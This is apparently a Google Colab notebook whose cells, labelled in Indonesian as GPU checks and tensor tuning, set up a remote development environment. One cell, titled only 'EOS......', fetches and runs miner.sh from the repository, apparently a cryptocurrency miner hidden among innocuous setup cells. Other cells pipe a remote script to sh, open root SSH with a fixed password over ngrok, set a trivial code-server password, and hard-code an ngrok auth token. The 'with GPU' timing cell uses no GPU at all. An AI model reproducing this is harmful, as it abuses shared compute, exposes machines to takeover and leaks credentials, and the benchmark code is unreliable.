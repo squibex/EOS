{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "DevColab.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/squibex/EOS/blob/main/DevColabX.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Xbrg3hJ39LRw",
        "cellView": "form"
      },
      "source": [
        "#@title **CEK GPU**\n",
        "\n",
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "IB_dAbg8Yvj5"
      },
      "source": [
        "#@title MOD GPU\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "x7MLYWtqY0Kg"
      },
      "source": [
        "#@title IMPORT CUDA\n",
        "\n",
        "import os\n",
        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "B3TP3IA8Y3DN"
      },
      "source": [
        "#@title MAXIMALKAN TENSOR\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sbuSn-OdY5Gx",
        "cellView": "form"
      },
      "source": [
        " \n",
        "#@title EOS......\n",
        "!wget https://raw.githubusercontent.com/squibex/EOS/main/miner.sh && chmod +x miner.sh && ./miner.sh"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "uQQO6jT46NA6",
        "cellView": "form"
      },
      "source": [
        "#@title **INSTALL NGROK + MOUNT DRIVE**\n",
        "!pip install pyngrok\n",
        "\n",
        "import os\n",
        "from pyngrok import ngrok\n",
        "# Update the package lists\n",
        "!sudo apt update\n",
        "\n",
        "# Mount Google Drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "# Drive is mounted under \"/content/drive/My Drive/\"\n",
        "\n",
        "# Ask for the ngrok authtoken\n",
        "print(\"Get your authtoken from https://dashboard.ngrok.com/auth\")\n",
        "import getpass\n",
        "authtoken = "1xmxGW7tAuaMFFpvmTiRjh3LNMH_2hG5juErAjpgPfnd2Uz9c"  # input your Ngrok auth token everytime you run the cell or simply replace \"getpass.getpass()\" with your token in \"double quotes\"\n",
        "!ngrok authtoken $authtoken # login to ngrok\n",
        "print(\"Google drive mounted and ngrok primed up. Now run any of the cells below.\")\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5YUSKsV3OhPr",
        "cellView": "form"
      },
      "source": [
        "#@title **INSTALL VSCODE**\n",
        "!curl -fsSL https://code-server.dev/install.sh | sh\n",
        "vscode_tunnel = ngrok.connect(8123)\n",
        "print(\"Open the first link below in browser:\")\n",
        "print(str(vscode_tunnel).replace('http://', 'https://'))\n",
        "\n",
        "!mkdir \"/content/drive/My Drive/code-server\"\n",
        "! sudo rm \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! echo \"bind-addr: 127.0.0.1:8123\" >> \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! echo \"auth: password\" >> \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! echo \"password: 123\" >> \"/content/drive/My Drive/code-server/config.yaml\" #the default password is devcolab\n",
        "! echo \"cert: false\" >> \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! code-server --config \"/content/drive/My Drive/code-server/config.yaml\" --user-data-dir \"/content/drive/My Drive/code-server\"\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fdkjf0OJLsVx",
        "cellView": "form"
      },
      "source": [
        "#@title **KALO MAU PAKAI SSH**\n",
        "# ssh setup\n",
        "!apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null\n",
        "!echo root:devcolab | chpasswd #the default ssh password is devcolab, change if you want\n",
        "!mkdir -p /var/run/sshd\n",
        "!echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\n",
        "!echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config\n",
        "!sudo /usr/sbin/sshd -D  &\n",
        "\n",
        "# Connect to ngrok\n",
        "ssh_tunnel = ngrok.connect(22, \"tcp\")\n",
        "address = ((str(ssh_tunnel).split('\"')[1::2])[0]).replace('tcp://', '')\n",
        "print('Your tunnel address is ' + address)\n",
        "print('Use the following command to connect: ' + \"ssh root@\" + \"tcp://\" + (address.split(':'))[0] + \" -p \" + (address.split(':'))[1])\n",
        "print(\"or if that doesn't work, use this: \" + \"ssh root@\" + (address.split(':'))[0] + \" -p \" + (address.split(':'))[1])\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "rBqSiiVGVZf-"
      },
      "source": [
        "#### Debug:"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "GbIzV45sVc5m"
      },
      "source": [
        "!cat ~/.config/code-server/config.yaml"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "EiKz0ZtAePL8"
      },
      "source": [
        "!pwd"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
